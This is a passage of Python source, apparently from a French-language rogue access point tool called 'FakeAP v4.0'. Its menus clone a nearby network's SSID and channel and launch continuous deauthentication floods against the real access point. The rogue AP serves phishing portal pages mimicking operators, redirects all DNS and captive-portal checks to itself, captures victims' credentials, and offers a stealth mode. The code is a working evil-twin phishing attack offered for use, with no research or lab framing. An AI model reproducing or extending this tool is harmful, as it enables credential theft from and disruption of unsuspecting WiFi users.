    global CURRENT_DHCP_START, CURRENT_DHCP_END, CURRENT_DHCP_LEASE
    global CURRENT_DNS, CURRENT_CHANNEL, SELECTED_SSID, CURRENT_REDIRECT
    global AP_AUTH_MODE, AP_WPA_PASS, STEALTH_MODE, MAX_ATTEMPTS
    global BLOCK_AFTER_CAP, WHITELIST_MAC, SELECTED_FILE

    os.makedirs(PROFILES_DIR, exist_ok=True)
    profiles = [f for f in os.listdir(PROFILES_DIR) if f.endswith('.json')]
    if not profiles:
        print(f"  {C.WARN}Aucun profil sauvegardé{C.END}"); time.sleep(2); return

    print_section("PROFILS DISPONIBLES")
    for i, p in enumerate(profiles, 1):
        print(f"  {C.YELLOW}[{i}]{C.END} {p.replace('.json','')}")
    try:
        choice = int(input(f"  {C.PROMPT}Charger [{C.YELLOW}1-{len(profiles)}{C.END}]: ").strip())
        if not 1 <= choice <= len(profiles): raise ValueError
    except (ValueError, KeyboardInterrupt):
        print(f"  {C.ALERT}Annulé{C.END}"); time.sleep(1); return

    path = os.path.join(PROFILES_DIR, profiles[choice-1])
    with open(path) as f: p = json.load(f)

    CURRENT_INTERFACE  = p.get('interface',  CURRENT_INTERFACE)
    CURRENT_GATEWAY    = p.get('gateway',    CURRENT_GATEWAY)
    CURRENT_NETMASK    = p.get('netmask',    CURRENT_NETMASK)
    CURRENT_DHCP_START = p.get('dhcp_start', CURRENT_DHCP_START)
    CURRENT_DHCP_END   = p.get('dhcp_end',   CURRENT_DHCP_END)
    CURRENT_DHCP_LEASE = p.get('dhcp_lease', CURRENT_DHCP_LEASE)
    CURRENT_DNS        = p.get('dns',        CURRENT_DNS)
    CURRENT_CHANNEL    = p.get('channel',    CURRENT_CHANNEL)
    SELECTED_SSID      = p.get('ssid',       SELECTED_SSID)
    CURRENT_REDIRECT   = p.get('redirect',   CURRENT_REDIRECT)
    AP_AUTH_MODE       = p.get('ap_auth',    AP_AUTH_MODE)
    AP_WPA_PASS        = p.get('ap_wpa_pass',AP_WPA_PASS)
    STEALTH_MODE       = p.get('stealth',    STEALTH_MODE)
    MAX_ATTEMPTS       = p.get('max_attempts',MAX_ATTEMPTS)
    BLOCK_AFTER_CAP    = p.get('block_after_cap', BLOCK_AFTER_CAP)
    WHITELIST_MAC      = set(p.get('whitelist', []))
    SELECTED_FILE      = p.get('page', SELECTED_FILE)

    print(f"  {C.OK}Profil chargé: {C.CYAN}{p.get('name','?')}{C.END}"); time.sleep(2)

# ═══════════════════════════════════════════════════════════
#  QR CODE SSID
# ═══════════════════════════════════════════════════════════
def print_qr_code(ssid, password="", auth="nopass"):
    wifi_str = f"WIFI:S:{ssid};T:{auth};P:{password};;"
    print_section(f"QR CODE — {ssid}")

    # Méthode 1: qrencode
    try:
        r = subprocess.run(f'qrencode -t UTF8 "{wifi_str}"', shell=True,
                           capture_output=True, text=True)
        if r.returncode == 0 and r.stdout.strip():
            for line in r.stdout.split('\n'):
                print(f"  {line}")
            print(f"\n  {C.CYAN}SSID: {C.WHITE}{C.BOLD}{ssid}{C.END}")
            if password: print(f"  {C.CYAN}PASS: {C.YELLOW}{password}{C.END}")
            input(f"\n  {C.DIM}[ Entrée pour continuer ]{C.END}"); return
    except: pass

    # Méthode 2: module qrcode Python
    try:
        import qrcode as qrc
        qr = qrc.QRCode(border=2)
        qr.add_data(wifi_str); qr.make(fit=True)
        qr.print_ascii(invert=True)
        print(f"\n  {C.CYAN}SSID: {C.WHITE}{C.BOLD}{ssid}{C.END}")
        input(f"\n  {C.DIM}[ Entrée pour continuer ]{C.END}"); return
    except ImportError: pass
    except Exception: pass

    # Fallback: affichage texte
    print(f"\n  {C.WARN}qrencode non installé. Installez-le:{C.END}")
    print(f"  {C.CYAN}sudo apt install qrencode{C.END}")
    print(f"  {C.CYAN}# ou: pip install qrcode --break-system-packages{C.END}")
    print(f"\n  {C.WHITE}{C.BOLD}WiFi: {ssid}{C.END}")
    if password: print(f"  {C.YELLOW}Pass: {password}{C.END}")
    print(f"  {C.DIM}Data: {wifi_str}{C.END}")
    input(f"\n  {C.DIM}[ Entrée pour continuer ]{C.END}")

# ═══════════════════════════════════════════════════════════
#  WATCHDOG
# ═══════════════════════════════════════════════════════════
_watchdog_procs = {}  # {'dns': proc, 'ap': proc}

def watchdog_loop():
    global WATCHDOG_RUNNING
    check_interval = 30
    while WATCHDOG_RUNNING:
        for _ in range(check_interval * 10):
            if not WATCHDOG_RUNNING: return
            time.sleep(0.1)

        if not STEALTH_MODE:
            ts = datetime.now().strftime("%H:%M:%S")

        # Vérifier hostapd
        if run_silent("pgrep hostapd").returncode != 0:
            if not STEALTH_MODE: print(f"\n  {C.WARN}[WATCHDOG {ts}] hostapd tombé — redémarrage...{C.END}")
            proc = _watchdog_procs.get('ap')
            if proc: proc.kill()
            _watchdog_procs['ap'] = subprocess.Popen(
                ["sudo", "hostapd", "/tmp/hostapd.conf"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if not STEALTH_MODE: print(f"  {C.OK}[WATCHDOG] hostapd redémarré{C.END}")
            sys.stdout.flush()

        # Vérifier dnsmasq
        if run_silent("pgrep dnsmasq").returncode != 0:
            if not STEALTH_MODE: print(f"\n  {C.WARN}[WATCHDOG {ts}] dnsmasq tombé — redémarrage...{C.END}")
            proc = _watchdog_procs.get('dns')
            if proc: proc.kill()
            _watchdog_procs['dns'] = subprocess.Popen(
                ["sudo", "dnsmasq", "-C", "/tmp/dnsmasq.conf", "--no-daemon"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if not STEALTH_MODE: print(f"  {C.OK}[WATCHDOG] dnsmasq redémarré{C.END}")
            sys.stdout.flush()

def start_watchdog():
    global WATCHDOG_RUNNING
    if WATCHDOG_RUNNING: return
    WATCHDOG_RUNNING = True
    t = threading.Thread(target=watchdog_loop, daemon=True)
    t.start()
    print(f"  {C.OK}Watchdog démarré (vérification toutes les 30s){C.END}")

def stop_watchdog():
    global WATCHDOG_RUNNING
    WATCHDOG_RUNNING = False
    print(f"  {C.OK}Watchdog arrêté{C.END}")

# ═══════════════════════════════════════════════════════════
#  MENU OPTIONS AVANCÉES (option 24)
# ═══════════════════════════════════════════════════════════
def show_advanced_options():
    global STEALTH_MODE, MAX_ATTEMPTS, BLOCK_AFTER_CAP
    global WHITELIST_MAC, AP_AUTH_MODE, AP_WPA_PASS, DEAUTH_CONTINUOUS

    while True:
        clear_screen(); print_banner()
        print_header("⚙  OPTIONS AVANCÉES  —  OPTION 24", C.PURPLE)
        print()

        sm_str  = f"{C.GREEN}ACTIF{C.END}"   if STEALTH_MODE   else f"{C.RED}INACTIF{C.END}"
        wd_str  = f"{C.GREEN}ACTIF{C.END}"   if WATCHDOG_RUNNING else f"{C.RED}INACTIF{C.END}"
        dc_str  = f"{C.RED}ACTIF{C.END}"     if DEAUTH_RUNNING  else f"{C.BLACK}INACTIF{C.END}"
        bl_str  = f"{C.YELLOW}ACTIF{C.END}"  if BLOCK_AFTER_CAP else f"{C.BLACK}INACTIF{C.END}"
        am_str  = f"{C.RED}WPA2-fake{C.END}" if AP_AUTH_MODE=="wpa2" else f"{C.GREEN}OPEN{C.END}"
        wl_str  = f"{C.YELLOW}{len(WHITELIST_MAC)} MAC(s){C.END}"

        print_menu_item(1,  f"Mode Stealth",                    "active", sm_str)
        print_menu_item(2,  f"Watchdog (auto-restart services)","active", wd_str)
        print_menu_item(3,  f"Deauth continu",                  "active", dc_str)
        print_menu_item(4,  f"Mode AP",                         "active", am_str)
        if AP_AUTH_MODE == "wpa2":
            print_menu_item(5, f"Mot de passe WPA2 fake",       "active", AP_WPA_PASS)
        print_menu_item(6,  f"Blocage après capture",           "active", bl_str)
        print_menu_item(7,  f"Max tentatives par IP",           "active", str(MAX_ATTEMPTS))
        print_menu_item(8,  f"Whitelist MAC",                   "active", wl_str)
        print_menu_item(9,  f"Vider IPs bloquées ({len(BLOCKED_IPS)})",   "active")
        print_menu_item(10, f"Log HTTP ({HTTP_LOG_FILE})",       "active")
        print(f"\n  {C.RED}●{C.END} {C.YELLOW}[ 0]{C.END}  {C.RED}Retour{C.END}")
        divider('═')

        choice = input(f"\n  {C.PROMPT}Choix [0-10]: ").strip()

        if choice == '0': break
        elif choice == '1':
            STEALTH_MODE = not STEALTH_MODE
            print(f"  {C.OK}Stealth mode: {'ON' if STEALTH_MODE else 'OFF'}{C.END}"); time.sleep(1)
        elif choice == '2':
            if WATCHDOG_RUNNING: stop_watchdog()
            else: start_watchdog()
            time.sleep(1)
        elif choice == '3':
            start_continuous_deauth(); time.sleep(1)
        elif choice == '4':
            AP_AUTH_MODE = "wpa2" if AP_AUTH_MODE == "open" else "open"
            print(f"  {C.OK}Mode AP: {AP_AUTH_MODE.upper()}{C.END}"); time.sleep(1)
        elif choice == '5':
            v = input(f"  {C.PROMPT}Nouveau mot de passe WPA2 (8+ chars): ").strip()
            if v and len(v) >= 8: AP_WPA_PASS = v; print(f"  {C.OK}WPA2 pass: {AP_WPA_PASS}{C.END}")
            else: print(f"  {C.ALERT}Minimum 8 caractères{C.END}")
            time.sleep(1)
        elif choice == '6':
            BLOCK_AFTER_CAP = not BLOCK_AFTER_CAP
            print(f"  {C.OK}Blocage post-capture: {'ON' if BLOCK_AFTER_CAP else 'OFF'}{C.END}"); time.sleep(1)
        elif choice == '7':
            try:
                v = int(input(f"  {C.PROMPT}Max tentatives [{MAX_ATTEMPTS}]: ").strip())
                if v > 0: MAX_ATTEMPTS = v; print(f"  {C.OK}Max tentatives: {MAX_ATTEMPTS}{C.END}")
            except: print(f"  {C.ALERT}Invalide{C.END}")
            time.sleep(1)
        elif choice == '8':
            print_section("WHITELIST MAC")
            print(f"  {C.DIM}MACs actuelles: {', '.join(WHITELIST_MAC) or 'aucune'}{C.END}")
            print(f"  [1] Ajouter  [2] Supprimer  [0] Retour")
            sub = input(f"  {C.PROMPT}: ").strip()
            if sub == '1':
                mac = input(f"  {C.PROMPT}MAC (ex: AA:BB:CC:DD:EE:FF): ").strip().upper()
                if re.match(r'([0-9A-F]{2}:){5}[0-9A-F]{2}', mac):
                    WHITELIST_MAC.add(mac); print(f"  {C.OK}MAC ajoutée: {mac}{C.END}")
                else: print(f"  {C.ALERT}Format invalide{C.END}")
            elif sub == '2' and WHITELIST_MAC:
                lst = list(WHITELIST_MAC)
                for i, m in enumerate(lst, 1): print(f"  [{i}] {m}")
                try:
                    idx = int(input(f"  {C.PROMPT}Supprimer: ").strip()) - 1
                    WHITELIST_MAC.discard(lst[idx]); print(f"  {C.OK}Supprimée{C.END}")
                except: pass
            time.sleep(1)
        elif choice == '9':
            BLOCKED_IPS.clear()
            run_silent("sudo iptables -F INPUT"); run_silent("sudo iptables -F FORWARD")
            run_silent(f"sudo iptables -A INPUT -i {CURRENT_INTERFACE} -j ACCEPT")
            run_silent(f"sudo iptables -A FORWARD -i {CURRENT_INTERFACE} -j ACCEPT")
            print(f"  {C.OK}IPs bloquées vidées + règles iptables réinitialisées{C.END}"); time.sleep(2)
        elif choice == '10':
            if os.path.exists(HTTP_LOG_FILE):
                print(f"  {C.INFO}Dernières 15 lignes de {HTTP_LOG_FILE}:{C.END}\n")
                try:
                    with open(HTTP_LOG_FILE) as f: lines = f.readlines()
                    for line in lines[-15:]: print(f"  {C.DIM}{line.rstrip()}{C.END}")
                except: print(f"  {C.ALERT}Erreur lecture log{C.END}")
            else: print(f"  {C.DIM}Aucun log HTTP pour le moment{C.END}")
            input(f"\n  {C.DIM}[ Entrée pour continuer ]{C.END}")

# ═══════════════════════════════════════════════════════════
#  MENU CONFIGURATION RÉSEAU (option 11)
# ═══════════════════════════════════════════════════════════
def show_manual_config_menu():
    global CURRENT_INTERFACE, CURRENT_GATEWAY, CURRENT_NETMASK
    global CURRENT_DHCP_START, CURRENT_DHCP_END, CURRENT_DHCP_LEASE
    global CURRENT_DNS, CURRENT_CHANNEL, SELECTED_SSID, CURRENT_REDIRECT
    global INTERFACE_AP, INTERFACE_DEAUTH

    while True:
        clear_screen(); print_banner()
        print_header("⚙  CONFIGURATION RÉSEAU  —  OPTION 11", C.CYAN)
        print()
        print_menu_item(1,  "Interface WiFi (AP)",           "active", INTERFACE_AP)
        if DUAL_CARD_MODE:
            print_menu_item(2, "Interface WiFi (Deauth)",   "active", INTERFACE_DEAUTH)
        print_menu_item(3,  "IP Gateway",                    "active", CURRENT_GATEWAY)
        print_menu_item(4,  "Masque CIDR",                   "active", f"/{CURRENT_NETMASK}")
        print_menu_item(5,  "DHCP début",                    "active", CURRENT_DHCP_START)
        print_menu_item(6,  "DHCP fin",                      "active", CURRENT_DHCP_END)
        print_menu_item(7,  "Bail DHCP",                     "active", CURRENT_DHCP_LEASE)
        print_menu_item(8,  "Serveur DNS",                   "active", CURRENT_DNS)
        print_menu_item(9,  "Canal WiFi",                    "active", CURRENT_CHANNEL)
        print_menu_item(10, "SSID",                          "active", SELECTED_SSID)
        print_menu_item(11, "SSID aléatoire",                "active")
        print_menu_item(12, "Canal auto (moins congestionné)","active")
        print_menu_item(13, "Page de redirection",           "active", CURRENT_REDIRECT[:40])
        print_menu_item(14, "Afficher config actuelle",      "active")
        print_menu_item(15, "Réinitialiser par défaut",      "active")
        print(f"\n  {C.RED}●{C.END} {C.YELLOW}[ 0]{C.END}  {C.RED}Retour{C.END}")
        divider('═')

        choice = input(f"\n  {C.PROMPT}Choix [0-15]: ").strip()

        if choice == '0': break
        elif choice == '1':
            interfaces = get_available_interfaces()
            print_section("INTERFACES AP")
            for i, iface in enumerate(interfaces, 1): print(f"  {C.YELLOW}[{i}]{C.END} {iface}")
            try:
                ic = int(input(f"  {C.PROMPT}Choix: ").strip())
                if 1 <= ic <= len(interfaces):
                    INTERFACE_AP = interfaces[ic-1]; CURRENT_INTERFACE = INTERFACE_AP
                    print(f"  {C.OK}Interface AP → {INTERFACE_AP}{C.END}")
            except: print(f"  {C.ALERT}Invalide{C.END}")
            time.sleep(2)
        elif choice == '2' and DUAL_CARD_MODE:
            interfaces = get_available_interfaces()
            print_section("INTERFACES DEAUTH")
            for i, iface in enumerate(interfaces, 1): print(f"  {C.YELLOW}[{i}]{C.END} {iface}")
            try:
                ic = int(input(f"  {C.PROMPT}Choix: ").strip())
                if 1 <= ic <= len(interfaces):
                    INTERFACE_DEAUTH = interfaces[ic-1]
                    print(f"  {C.OK}Interface Deauth → {INTERFACE_DEAUTH}{C.END}")
            except: print(f"  {C.ALERT}Invalide{C.END}")
            time.sleep(2)
        elif choice == '3':
            v = input(f"  {C.PROMPT}Gateway [{CURRENT_GATEWAY}]: ").strip()
            if v: CURRENT_GATEWAY = v; print(f"  {C.OK}Gateway → {CURRENT_GATEWAY}{C.END}")
            time.sleep(1)
        elif choice == '4':
            v = input(f"  {C.PROMPT}Masque CIDR [{CURRENT_NETMASK}]: ").strip()
            if v: CURRENT_NETMASK = v
            time.sleep(1)
        elif choice == '5':
            v = input(f"  {C.PROMPT}DHCP début [{CURRENT_DHCP_START}]: ").strip()
            if v: CURRENT_DHCP_START = v
            time.sleep(1)
        elif choice == '6':
            v = input(f"  {C.PROMPT}DHCP fin [{CURRENT_DHCP_END}]: ").strip()
            if v: CURRENT_DHCP_END = v
            time.sleep(1)
        elif choice == '7':
            v = input(f"  {C.PROMPT}Bail [{CURRENT_DHCP_LEASE}]: ").strip()
            if v: CURRENT_DHCP_LEASE = v
            time.sleep(1)
        elif choice == '8':
            v = input(f"  {C.PROMPT}DNS [{CURRENT_DNS}]: ").strip()
            if v: CURRENT_DNS = v
            time.sleep(1)
        elif choice == '9':
            v = input(f"  {C.PROMPT}Canal [1-11] [{CURRENT_CHANNEL}]: ").strip()
            if v and v.isdigit() and 1 <= int(v) <= 11: CURRENT_CHANNEL = v
            else: print(f"  {C.ALERT}Canal invalide (1-11){C.END}")
            time.sleep(1)
        elif choice == '10':
            v = input(f"  {C.PROMPT}SSID [{SELECTED_SSID}]: ").strip()
            if v: SELECTED_SSID = v.replace(" ","_")
            time.sleep(1)
        elif choice == '11':
            print_section("SSID ALÉATOIRE")
            ops = list(SSID_TEMPLATES.keys())
            for i, op in enumerate(ops, 1): print(f"  {C.YELLOW}[{i}]{C.END} {op}")
            print(f"  {C.YELLOW}[0]{C.END} Opérateur aléatoire")
            try:
                ic = int(input(f"  {C.PROMPT}Opérateur: ").strip())
                op = ops[ic-1] if 1 <= ic <= len(ops) else None
                SELECTED_SSID = generate_random_ssid(op)
                print(f"  {C.OK}SSID généré: {C.PURPLE}{C.BOLD}{SELECTED_SSID}{C.END}")
            except: SELECTED_SSID = generate_random_ssid()
            time.sleep(2)
        elif choice == '12':
            CURRENT_CHANNEL = auto_select_channel(CURRENT_INTERFACE)
            time.sleep(2)
        elif choice == '13':
            print_section("REDIRECTION")
            for num, p in REDIRECT_PAGES.items():
                print(f"  {C.YELLOW}[{num}]{C.END} {p['name']}  {C.DIM}{p['url'] or '(personnalisé)'}{C.END}")
            try:
                rc = int(input(f"  {C.PROMPT}Choix [1-7]: ").strip())
                if 1 <= rc <= 7:
                    if rc == 6:
                        u = input(f"  {C.PROMPT}URL: ").strip()
                        if u: CURRENT_REDIRECT = u; REDIRECT_PAGES[6]['url'] = u
                    else: CURRENT_REDIRECT = REDIRECT_PAGES[rc]['url']
                    print(f"  {C.OK}→ {CURRENT_REDIRECT}{C.END}")
            except: print(f"  {C.ALERT}Invalide{C.END}")
            time.sleep(2)
        elif choice == '14':
            print_section("CONFIGURATION ACTUELLE")
            rows = [
                ("Interface AP",  INTERFACE_AP),
                ("Interface DX",  INTERFACE_DEAUTH),
                ("Gateway",       f"{CURRENT_GATEWAY}/{CURRENT_NETMASK}"),
                ("DHCP range",    f"{CURRENT_DHCP_START} → {CURRENT_DHCP_END}"),
                ("Bail DHCP",     CURRENT_DHCP_LEASE),
                ("DNS",           CURRENT_DNS),
                ("Canal WiFi",    CURRENT_CHANNEL),
                ("SSID",          SELECTED_SSID),
                ("Mode AP",       AP_AUTH_MODE),
                ("Redirect",      CURRENT_REDIRECT),
            ]
            for k, v in rows: print(f"  {C.CYAN}{k:<14}{C.END}: {C.WHITE}{v}{C.END}")
            input(f"\n  {C.DIM}[ Entrée ]{C.END}")
        elif choice == '15':
            if input(f"  {C.PROMPT}Réinitialiser? {C.RED}(o/N){C.END}: ").strip().lower() == 'o':
                CURRENT_INTERFACE = CURRENT_GATEWAY = CURRENT_NETMASK = None
                CURRENT_INTERFACE = INTERFACE; CURRENT_GATEWAY = GATEWAY_IP
                CURRENT_NETMASK = NETMASK; CURRENT_DHCP_START = DHCP_START
                CURRENT_DHCP_END = DHCP_END; CURRENT_DHCP_LEASE = DHCP_LEASE
                CURRENT_DNS = DNS_SERVER; CURRENT_CHANNEL = CHANNEL
                SELECTED_SSID = "Airtel_Free_WiFi"; CURRENT_REDIRECT = REDIRECT_URL
                print(f"  {C.OK}Réinitialisé{C.END}"); time.sleep(1)

# ═══════════════════════════════════════════════════════════
#  MENU CLONE WIFI (option 12)
# ═══════════════════════════════════════════════════════════
def show_wifi_cloner_menu():
    global SELECTED_SSID, CURRENT_CHANNEL, DEAUTH_THREAD, SELECTED_PAGE
    global SELECTED_FILE, CURRENT_REDIRECT, DEAUTH_RUNNING, CONTINUOUS_DEAUTH_TARGET

    print_header("⚔  CLONE WIFI + DEAUTH  —  OPTION 12", C.RED)
    print(f"\n  {C.DIM}Scanner → sélectionner → cloner le SSID + canal → deauth{C.END}")

    if DUAL_CARD_MODE:
        print(f"  {C.OK}2 cartes: AP={INTERFACE_AP}  Deauth={INTERFACE_DEAUTH}{C.END}")
        scan_iface = INTERFACE_DEAUTH
    else:
        ifaces = get_available_interfaces()
        scan_iface = ifaces[0] if ifaces else CURRENT_INTERFACE
        print(f"  {C.WARN}1 carte — {scan_iface}{C.END}")

    if input(f"\n  {C.PROMPT}Continuer? {C.RED}(o/N){C.END}: ").strip().lower() != 'o': return

    networks = scan_wifi_networks(scan_iface)
    if not networks:
        print(f"  {C.ALERT}Aucun réseau{C.END}"); time.sleep(3); return

    print_section(f"RÉSEAUX — {len(networks)} trouvé(s)"); divider()
    valid = []
    for i, net in enumerate(networks, 1):
        if not net.get('ssid'): continue
        valid.append(net)
        try:
            dbm = int(float(net.get('signal','-50')))
            if dbm > -50:   sc,sb = C.GREEN, "████████"
            elif dbm > -65: sc,sb = C.GREEN, "██████░░"
            elif dbm > -75: sc,sb = C.YELLOW,"████░░░░"
            else:           sc,sb = C.RED,   "██░░░░░░"
        except: sc,sb = C.YELLOW,"████░░░░"; dbm = -50
        freq = net.get('freq','2412')
        try: fi=int(freq); ch=str((fi-2412)//5+1) if 2412<=fi<=2484 else str((fi-5180)//5+36)
        except: ch="6"
        print(f"\n  {C.YELLOW}{C.BOLD}[{i:>2}]{C.END}  {C.WHITE}{C.BOLD}{net['ssid']}{C.END}")
        print(f"        {C.BLACK}BSSID:{C.END} {C.DIM}{net['bssid']}{C.END}  CH:{C.CYAN}{ch}{C.END}  {sc}{sb} {dbm}dBm{C.END}")
    divider()

    try:
        choice = int(input(f"\n  {C.PROMPT}Cible [1-{len(valid)}]: ").strip())
        if not 1 <= choice <= len(valid): raise ValueError
        target = valid[choice - 1]
    except (ValueError, KeyboardInterrupt): print(f"  {C.ALERT}Annulé{C.END}"); time.sleep(1); return

    freq = target.get('freq','2412')
    try: fi=int(freq); ch=str((fi-2412)//5+1) if 2412<=fi<=2484 else str((fi-5180)//5+36)
    except: ch="6"

    SELECTED_SSID   = target['ssid'].replace(" ","_").replace("'","").replace('"',"")
    CURRENT_CHANNEL = ch; SELECTED_PAGE = PAGES[13]
    SELECTED_FILE   = "wifitoo.html"; CURRENT_REDIRECT = "http://192.168.10.1/wifitoo.html"
    CONTINUOUS_DEAUTH_TARGET = {'bssid': target['bssid'], 'ssid': target['ssid'], 'interface': scan_iface}

    print(); progress_bar("CONFIGURATION CLONE", total=20, delay=0.04)
    print(f"  {C.OK}SSID  → {C.PURPLE}{C.BOLD}{SELECTED_SSID}{C.END}")
    print(f"  {C.INFO}BSSID → {C.RED}{target['bssid']}{C.END}   Canal → {C.YELLOW}{ch}{C.END}")

    cont_q = input(f"\n  {C.PROMPT}Deauth continu? {C.RED}(o/N){C.END}: ").strip().lower()
    continuous = (cont_q == 'o')

    if DEAUTH_THREAD and DEAUTH_THREAD.is_alive():
        DEAUTH_RUNNING = False; DEAUTH_THREAD.join(timeout=2)

    DEAUTH_RUNNING = True
    DEAUTH_THREAD  = threading.Thread(target=deauth_attack,
                     args=(target['bssid'], target['ssid'], scan_iface, 10, continuous), daemon=True)
    DEAUTH_THREAD.start()
    print(f"\n  {C.OK}Clone actif — AP démarrera dans la foulée{C.END}")
    time.sleep(4)

# ═══════════════════════════════════════════════════════════
#  MENU PRINCIPAL
# ═══════════════════════════════════════════════════════════
def show_menu():
    global SELECTED_PAGE, SELECTED_SSID, SELECTED_FILE

    def draw():
        print_header("☞  FAKEAP v4.0  —  SÉLECTION", C.GREEN)
        print()
        # Pages portail
        print(f"  {C.GREEN}{C.BOLD}┌{'─'*64}┐{C.END}")
        print(f"  {C.GREEN}{C.BOLD}│{C.END}{C.CYAN}  PORTAIL PAGES{' '*50}{C.GREEN}{C.BOLD}│{C.END}")
        print(f"  {C.GREEN}{C.BOLD}└{'─'*64}┘{C.END}")
        for num, pi in PAGES.items():
            is_inline = pi['file'].startswith('__')
            exists    = is_inline or os.path.exists(pi['file'])
            extra     = pi['ssid'] if exists else f"{C.RED}MANQUANT{C.END}"
            print_menu_item(num, pi['name'], "active" if exists else "missing", extra)
        divider()
        # Outils
        print(f"\n  {C.PURPLE}{C.BOLD}┌{'─'*64}┐{C.END}")
        print(f"  {C.PURPLE}{C.BOLD}│{C.END}{C.YELLOW}  OUTILS{' '*57}{C.PURPLE}{C.BOLD}│{C.END}")
        print(f"  {C.PURPLE}{C.BOLD}└{'─'*64}┘{C.END}")
        print_menu_item(19, "Evil Twin Auto  (scan+clone+deauth tout-en-un)", "active")
        print_menu_item(20, "Live Captures   (tableau temps réel)",           "active")
        print_menu_item(21, "Stats & Export  (CSV + statistiques)",           "active")
        print_menu_item(22, "Profils         (sauvegarder / charger)",        "active")
        print_menu_item(23, "QR Code SSID    (afficher QR WiFi)",             "active")
        divider()
        # Système
        print(f"\n  {C.CYAN}{C.BOLD}┌{'─'*64}┐{C.END}")
        print(f"  {C.CYAN}{C.BOLD}│{C.END}{C.WHITE}  SYSTÈME{' '*56}{C.CYAN}{C.BOLD}│{C.END}")
        print(f"  {C.CYAN}{C.BOLD}└{'─'*64}┘{C.END}")
        print_menu_item(11, "Configuration réseau avancée",                  "active")
        print_menu_item(12, f"{C.RED}Clone WiFi + Deauth{C.END}",            "active")
        print_menu_item(24, f"{C.PURPLE}Options avancées (stealth/watchdog/whitelist){C.END}", "active")
        print(f"\n  {C.RED}●{C.END} {C.YELLOW}[ 0]{C.END}  {C.RED}Quitter FakeAP{C.END}")
        divider('═')

    draw()
    while True:
        try:
            choice = input(f"\n  {C.PROMPT}Choix: ").strip()

            if choice == '0':
                print(f"\n  {C.RED}{C.BOLD}[FakeAP] Fermeture...{C.END}")
                sys.exit(0)
            elif choice == '11':
                show_manual_config_menu(); clear_screen(); print_banner(); draw(); continue
            elif choice == '12':
                show_wifi_cloner_menu();   clear_screen(); print_banner(); draw(); continue
            elif choice == '19':
                evil_twin_auto();          clear_screen(); print_banner(); draw(); continue
            elif choice == '20':
                show_live_captures();      clear_screen(); print_banner(); draw(); continue
            elif choice == '21':
                clear_screen(); print_banner()
                print_header("📊 STATS & EXPORT", C.CYAN)
                print(f"\n  {C.YELLOW}[1]{C.END} Statistiques complètes")
                print(f"  {C.YELLOW}[2]{C.END} Exporter CSV")
                sc = input(f"\n  {C.PROMPT}Choix: ").strip()
                if sc == '1': show_stats()
                elif sc == '2': export_captures_csv()
                clear_screen(); print_banner(); draw(); continue
            elif choice == '22':
                clear_screen(); print_banner()
                print_header("💾 PROFILS", C.YELLOW)
                print(f"\n  {C.YELLOW}[1]{C.END} Sauvegarder profil")
                print(f"  {C.YELLOW}[2]{C.END} Charger profil")
                sc = input(f"\n  {C.PROMPT}Choix: ").strip()
                if sc == '1': save_profile()
                elif sc == '2': load_profile()
                clear_screen(); print_banner(); draw(); continue
            elif choice == '23':
                auth = "WPA" if AP_AUTH_MODE == "wpa2" else "nopass"
                pwd  = AP_WPA_PASS if AP_AUTH_MODE == "wpa2" else ""
                print_qr_code(SELECTED_SSID, pwd, auth)
                clear_screen(); print_banner(); draw(); continue
            elif choice == '24':
                show_advanced_options(); clear_screen(); print_banner(); draw(); continue

            choice_num = int(choice)
            if choice_num in PAGES:
                pi = PAGES[choice_num]
                if not SELECTED_SSID or SELECTED_SSID == "Airtel_Free_WiFi":
                    SELECTED_SSID = pi['ssid']
                SELECTED_FILE = pi['file']
                is_inline     = pi['file'].startswith('__')

                if not is_inline and pi['file'] != 'wifitoo.html' and not os.path.exists(pi['file']):
                    print(f"\n  {C.ALERT}{pi['file']} introuvable!{C.END}")
                    print(f"  {C.WARN}Les pages inline (14-18) ne nécessitent pas de fichier.{C.END}")
                    continue

                SELECTED_PAGE = pi
                print(); progress_bar("CHARGEMENT", total=20, delay=0.04)
                print(f"  {C.OK}Page    : {C.CYAN}{pi['name']}{C.END}")
                print(f"  {C.INFO}Fichier : {C.GREEN}{pi['file']}{C.END}  {'(inline)' if is_inline else ''}")
                print(f"  {C.INFO}SSID    : {C.PURPLE}{C.BOLD}{SELECTED_SSID}{C.END}")
                return True
            else:
                print(f"  {C.ALERT}Choix invalide{C.END}")

        except ValueError: print(f"  {C.ALERT}Entrée invalide{C.END}")
        except KeyboardInterrupt: print(f"\n  {C.RED}Interruption.{C.END}"); sys.exit(0)

# ═══════════════════════════════════════════════════════════
#  SERVICES RÉSEAU
# ═══════════════════════════════════════════════════════════
def setup_network():
    spinner("Arrêt NetworkManager", duration=1.8)
    run_silent("sudo systemctl stop NetworkManager"); time.sleep(2)
    run_silent(f"sudo ip link set {CURRENT_INTERFACE} down")
    run_silent(f"sudo ip addr flush dev {CURRENT_INTERFACE}")
    r = run_silent(f"sudo iw dev {CURRENT_INTERFACE} set type __ap")
    if r.returncode != 0:
        run_silent(f"sudo iwconfig {CURRENT_INTERFACE} mode master")
    run_silent(f"sudo ip addr add {CURRENT_GATEWAY}/{CURRENT_NETMASK} dev {CURRENT_INTERFACE}")
    run_silent(f"sudo ip link set {CURRENT_INTERFACE} up")
    print(f"  {C.OK}Interface {C.CYAN}{CURRENT_INTERFACE}{C.END} → {C.GREEN}{CURRENT_GATEWAY}/{CURRENT_NETMASK}{C.END}")

def start_dhcp_dns():
    spinner("Démarrage DHCP/DNS", duration=1.2)
    dnsmasq_conf = f"""interface={CURRENT_INTERFACE}
bind-interfaces
dhcp-range={CURRENT_DHCP_START},{CURRENT_DHCP_END},{CURRENT_DHCP_LEASE}
dhcp-option=option:router,{CURRENT_GATEWAY}
dhcp-option=option:dns-server,{CURRENT_DNS}
address=/#/{CURRENT_GATEWAY}
address=/clients3.google.com/{CURRENT_GATEWAY}
address=/connectivitycheck.gstatic.com/{CURRENT_GATEWAY}
address=/captive.apple.com/{CURRENT_GATEWAY}
address=/msftconnecttest.com/{CURRENT_GATEWAY}
no-resolv
"""
    with open("/tmp/dnsmasq_fakeap.conf","w") as f: f.write(dnsmasq_conf)
    proc = subprocess.Popen(["sudo","dnsmasq","-C","/tmp/dnsmasq_fakeap.conf","--no-daemon"],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    _watchdog_procs['dns'] = proc
    return proc

def start_access_point():
    spinner(f"Création AP · SSID: {SELECTED_SSID}", duration=1.2)
